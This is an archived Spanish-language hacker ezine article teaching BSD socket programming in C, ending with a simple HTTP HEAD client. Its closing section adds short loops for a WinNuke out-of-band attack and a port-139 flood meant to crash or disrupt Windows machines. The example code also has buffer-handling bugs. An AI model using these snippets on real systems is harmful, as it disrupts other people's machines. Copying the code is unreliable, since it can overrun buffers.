@@ -1,0 +1,365 @@
+---
+title: "0x003"
+ezine: "heh"
+---
+
+# 0x003
+
+**Ezine:** heh
+
+<div className="ascii-content">
+
+```
+
+o Programando en Internet  I
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+-=Estrella Invitada: Lenguaje de Programacion C
+-=Villano Invitado: Linux y *bsd
+-=Lo protagoniza, escribe, dibuja, produce y distribuye: Zomba
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Esta es la primer edicion de este texto especialmente hecho para la ezine
+HEH! , y lo voy a hacer en muchas ediciones, cada vez perfeccionandolo mas
+y mas...
+
+En esta primera edicion les voy a ense#ar los primeros conceptos de
+BSD Socket, y terminaremos aprendiendo como hacer un programa cliente.
+
+Hice unos cuantos apartados para los que tengan conocimientos en C, para
+ayudarlos a los mas avanzados, pero los que recien comienzan, no se
+asusten al no entender el apartado.
+
+++++++++++++++++++++++++++++++++++++++++++++
++ Aclaracion: Se presupone que la persona  +
++ que lea este texto tiene que tener cono_ +
++ cimientos de lenguaje C, y manejar Linux +
++ en lo posible. Aunque voy a intentar ha_ +
++ cerlo, lo mas entendible posible.        +
+++++++++++++++++++++++++++++++++++++++++++++
+
+Empezemos con la pregunta que se hace todo el mundo...
+
+*- Que Carajo es un Socket?
+No me voy a poner a explicar la historia de los sockets, vamos al grano
+Los sockets son una forma de intercambiar "informacion" entre programas
+usando Descriptores Unix. Mediante los sockets, los programas se pueden
+comunicar entre ellos. No necesariamente estamos hablando de Internet,
+si no que pueden ser usados dentro de su mismo sistema.
+
+////////////////////////////////////////////////////////////
+/Para los avanzados: Los sockets a diferencia de las Pipes /
+/tiene la ventaja de ser "Full Duplex", se puede escribir y/
+/leer un mismo sockets. Con los Pipes, solo se podia abrir /
+/lo para escritura o lectura, pero no los 2 al mismo tiempo/
+////////////////////////////////////////////////////////////
+
+Cuando nos referimso a un Descriptor Unix, es simplemente un variable
+integer (en este caso) asociado al Socket abierto, si no entienden esto
+lo entenderan mas adelante.
+
+////////////////////////////////////////////////////////////
+/Avanzados: Si manejan instrucciones de Escritura y Lectura/
+/de archivos en C, un descriptor seria la variable que lla /
+/mamos utilizando el tipo FILE, es decir:                  /
+/ FILE *hola;                                              /
+/ hola=fopen("archivo.txt", "w");                          /
+/ en este caso el descriptor seria hola                    /
+////////////////////////////////////////////////////////////
+
+Bueno, manos a la obra...
+Hay una estructura escencial a la hora de crear una conexion, esta
+estructura guarda en ella la informacion que luego le va a ayudar
+a el cliente a conectarse con el destino, por ejemplo guarda, la IP destino,
+el Puerto, etc.
+Veamosla mas a fondo:
+struct sockaddr_in {
+       short int           sin_family;
+       unsigned short int  sin_port;
+       struct in_addr      sin_addr;
+       unsigned char       sin_zero[8];
+};
+Esta estructura es escencial a la hora de jugar con Sockets en Internet.
+
+Veamosla a fondo:
+sin_family = este registro de la estructura guarda la informacion referente
+a la familia de Sockets. Hay varias familias, las mas conocidas son: AF_UNIX
+y AF_INET. AF_UNIX sirve para usar sockets a nivel local, en cambio, AF_INET
+sirve para utilizar sockets a nivel Internet. Tener en mente que la que vamos
+a usar es AF_INET, ya que la idea es programar en Internet.
+Existen otras familias como:
+        AF_ISO (Protocolos ISO)
+        AF_NS (Protocolos de Redes Xerox)
+        AF_IMPLINK (IMP "host at IMP" link layer)
+
+sin_port = este registro guarda simplemente el puerto en el cual nos
+vamos a conectar.
+
+in_addr = este registro guarda la IP a la cual nos vamos a conectar.
+
+sin_zero = este registro no nos interesa, pero hay que tener en cuenta, que
+lo tenemos que poner en 0, utilizando la funcion bzero() o memset() que mas
+adelante veremos.
+
+Bueno, antes de cualquier cosa, las cabeceras que tenemos que definir son
+sys/types.h y sys/socket.h
+es decir:
+#include&lt;sys/types.h>
+#include&lt;sys/socket.h>
+
+-* Obteniendo el famoso Descriptor.
+
+Para hacer eso, necesitamos usar la funcion socket()
+
+esta funcion se define asi:
+int socket(int familia, int tipo, int protocolo)
+
+Que sera esto? Bueno, es sencillo...
+En donde dice famila debemos poner AF_INET o AF_UNIX, esto ya fue explicado
+arriba.
+En donde tipo, tenemos que poner que tipo de conexion queremos hacer. Los
+tipos de conexiones que nos interesan son:
+
+SOCK_STREAM: Esta conexion es del tipo TCP, es decir una conexion en modo
+conectado, un ejemplo de esto es el telnet, ftp, etc.
+
+SOCK_DGRAM: Esta conexion es del tipo UDP, es decir una conexion en modo
+no conectado, un ejemplo podria ser ICQ o el talk.
+
+Existen otros como: SOCK_RAW, SOCK_SEQ_PACKET y SOCK_RDM
+
+El tercer parametro, es protocolo. Por ahora, dejamos 0 y si queres leer mas
+del tema: man 5 protocols .
+Un ejemplo de uso seria:
+   sockfd=socket(AF_INET, SOCK_STREAM,0);
+En donde el sockfd, es el descriptor de que tanto se habla y que tan usil
+va a ser.
+
+Bueno, ahora llega el momento en el cual nosotros tenemos que ingresar poco
+a poco, la informacion de la victima.
+
+Para eso tenemos que usar la estructura que ya vimos la famosa sockaddr_in
+Bueno, antes de todos, tenemos que asignarle el nombre de una variable a la
+estructura.
+Esto se hace asi:
+                struct sockaddr_in lalala;
+Ahora, la misma estructura que tiene sockaddr_in tiene lalala.
+
+Vamos asignarle poco a poco, la informacion de la victima:
+      lalala.sin_family=AF_INET
+Aqui le estamos metiendo en el campo sin_family de lalala, el tipo de Familia.
+      lalala.sin_port=htons(port)
+Bueno, aqui le asignamos el puerto al cual nos queremos conectar.
+Para asignarle el puerto, no podemos poner simplemente 80, ya que la maquina
+no entiende un puerto como nosotros lo llamamos.
+Para eso lo tenemos que pasar a formato "Network Short", que es el que entiende
+la maquina. Por eso utilizamos la funcion htons() "Host to Network Short".
+En este caso port es una variable de tipo Integer que contiene el nombre de
+puerto:
+int port=80;
+
+      lalala.sin_addr.s_addr=inet_addr("200.42.0.8")
+Al igual que con htons, el inet_addr() convierte una IP en una direccion que
+la maquina interpreta, sin '.'
+Bueno, una vez hecho esto, falta el ultimo paso:
+      bzero(&(lalala.sin_zero), 8);
+la funcio bzero, pone 8 ceros al campo sin_zero. Este es un campo especial del
+cual no nos vamos a deter a hablar, porque no es vital.
+
+-*Bueno! Manos a la obra! Conectandonos
+Lo que hace connect a groso modo, es conectar con el destino
+utilizando la informacion que nosotros poco a poco en nuestra estructura
+sockaddr_in.
+
+connect(int sockfd, struct sockaddr *destino, int addrlen)
+
+Esta es la sintaxis en general, vamos a verlo con el ejemplo que venimos
+llevando:
+connect(sockfd, (struct sockaddr*)&lalala, sizeof(lalala))
+
+/////////////////////////////////////////////////////////////
+/Avanzados: en realidad, existe una estructura original lla /
+/mada sockaddr, la sockaddr_in sirve para separar en campos /
+/los distinos aspectos de la estructura y facilitarnos el te/
+/ma, porque la estructura sockaddr en un solo campo guarda  /
+/IP y Puerto, entre otras cosas.                            /
+/////////////////////////////////////////////////////////////
+
+Bueno! Al fin conectados al destino! ahora es momento de mandar y recibir.
+
+-* Mandano y Recibiendo...
+
+Para mandar informacion a traves de TCP/IP se utiliza la funcion send()
+[Para protocolos como UDP, se utiliza sendto()]
+
+int send(int sockfd, const void *msg, int len, int flags)
+
+Bueno, veamosla poco a poco...
+sockfd= es el descriptor que abrimos con socket.
+msg= es la informacion que vamos a mandar.
+len= es el temanio que tiene msg (esto se puede sacar utilizando la funcion
+sizeof(len), que nos devuelve el tamanio de len).
+flags= Para ver las flags, hagan un $ man send() se van a encontrar con
+informacion muy interesante :)
+
+Veamoslo aplicado a nuestro ejemplo:
+
+char *msg="HEH! Rulez!";
+
+.. bla...bla...bla
+
+send(sockfd, msg, sizeof(msg), 0);
+
+Si nosotros tendriamos algun logger de algun puerto o algo por el estilo.
+Nos llegaria una conexion que nos envia el mensaje:
+HEH! Rulez
+
+Para recibir la informacion que nos manda un servidor, utilizamos la funcion
+recv() [en UDP seria, recvfrom()].
+Veamos la Sintaxis:
+
+int recv(int sockfd, void *buffer, int len, unsigned int flags)
+
+sockfd= ya sabemos lo que es :)
+buffer= es una variable que guarda la informacion que nos envia el servidor.
+len= es el tamanio de buffer [strlen(buffer)]
+flags= ya saben...
+
+Aplicacion al ejempo:
+
+char buffer[100];
+
+recv(sockfd, buffer, strlen(buffer), 0);
+printf("%s", buffer);
+
+con printf, mostramos el valor de la variable buffer, es decir el mensaje que
+nos mando el server.
+
+-* El Fin: Cerrando la conexion
+
+Para cerrar la conexion, usamos la funcion
+close(sockfd);
+
+Esto cierra el socket que abrimos y se corta la conexion con el server.
+
+Vamos a un ejemplo practico, recontra comentado
+Para compilarlo, recorten esta parte y peguenla en un archivo nuevo llamado
+cliente.c
+Finalmente: $ gcc cliente.c -o cliente
+
+
+<---------------------------------- CUT HERE --------------------------------->
+
+
+<++> cliente.c
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;string.h>
+#include &lt;sys/types.h>
+#include &lt;sys/socket.h>
+#include &lt;netinet/in.h>
+#include &lt;netdb.h>
+main()
+{
+int sockfd;       // Declaramos el descritor
+struct sockaddr_in lalala; // Nombramos a la sockaddr_in como lalala
+int port = 80;   //Decidimos a que puerto comunicarnos
+int a;
+char buffer[230];    // El buffer, donde almacenaremos lo que nos mande el serv
+char msg[18]="HEAD / HTTP/1.0\n\n\0"; // informacion que vamos a enviarle al se
+sockfd=socket(AF_INET, SOCK_STREAM, 0); //Creamos el descriptor y abrimos el
+                                        // socket
+    // Llenando el struct_in
+lalala.sin_family=AF_INET;      // Elegimos la Familia
+lalala.sin_port=htons(port);    //el Puerto
+lalala.sin_addr.s_addr=inet_addr("192.168.0.1"); //la IP
+bzero(&(lalala.sin_zero), 8);
+
+if (connect(sockfd, (struct sockaddr*)&lalala, sizeof(lalala)) < 0)
+    {
+        printf("Error creando la conexion");
+        exit(1);
+    }
+/*Poniendo ese If <0, lo que hacemos es controlar los errores, ya que si
+al hacer una conexion, el resultado que nos devuelve es mayor a 0, hubo
+algun problema */
+send(sockfd, msg, strlen(msg),0);
+/*Mandamos la informacion que contiene la variable msg, en este caso
+esa informacion es un comando llamado HEAD, este comando lo que hace, es
+pedirle a un servidor Web que nos devuelva el Encabezado.
+*/
+
+recv(sockfd, buffer, 240,0);
+/*Esto recibe el encabezado que le pedimos utilizando el comando HEAD */
+printf("Principio del Encabezado: \n\n");
+printf("%s", buffer); //aca lo mostramos en pantalla
+
+close(sockfd); //Ceramos el Socket
+
+printf("\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_");
+printf("\nPrograma para averiguar el Encabezado de un Servidor\nEjemplo del tex
+
+}
+<-->
+
+<---------------------------------- CUT HERE --------------------------------->
+
+
+
+Este programa lo que hace es utilizando el Comando HEAD, le pide en encabezado
+a un servidor de WWW, una vez devuelto lo muestra en pantalla.
+Es muy simple, pero util a la vez para poder conocer el daemon httpd, como
+por ejemplo Apache, IIS, etc.
+
+
+-* Alguna ideas:
+Si le hacemos un man al send(), podemos ver los tipos de Flags que se pueden
+enviar, entre ellos se encuentra uno muy singular, el MSG_OOB.
+Donde escuche hablar del OOB o Out Of Band?
+Exacto, el Nuke. La sintaxis para mandar un Nuke seria:
+send(sockfd, "Nuke Enviandose", 15, MSG_OOB);
+Esto, en algunos Windows 95 hacen que aparezca la famosa pantalla azul.
+
+Hagamos un for que repita 3000 veces el envido de este paquete
+for(a=1; a<3000;a++)
+{
+send(sockfd, "Nuke powered by HEH!.", 24, MSG_OOB);
+}
+(No es necesario los { } en este caso, pero los pongo para mejor entendimiento)
+
+Bueno, este es un invento mio:
+Hagamos lo mismo que antes, pero esta vez enviemos un nuevo paquete con un
+flag llamado MSG_DONTROUTE
+
+char *msg="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...";
+...
+...
+...
+for(a=1;a<3000;a++)
+{
+    send(sockfd, msg, strlen(msg), MSG_OOB);
+    send(sockfd, msg, strlen(msg), MSG_DONTROUTE);
+}
+Si no los podemos Nukear, les vamos a mandar un muy lindo Flood al puerto 139.
+En una LAN, puede traerte problemas serios.
+Mas informacion, preguntale a Dr_Sec y su NT :)
+
+Tambien se puede hacer cualquier cliente de cualquier servicio de esta forma
+Solo hay que conocer los comandos para utilizarlo (Recomiendo buscar info
+en los RFC) y manos a la obra.
+
+Bueno, esto fue todo en esta primera edicion...
+Quizas haya otras, si las hay, les voy a explicar como armar un servidor y
+otras como por ejemplo, como sacar la IP de una DNS, etc...
+Por lo pronto, sigan aprendiendo C y usen Linux.
+Sigan leyendo esta ezine que esta muy buena...
+
+          ^
+      -=Zomba=-
+/zombaq@ciudad.com.ar\
+----------------------
+
+    -EOF-
+```
+
+</div>
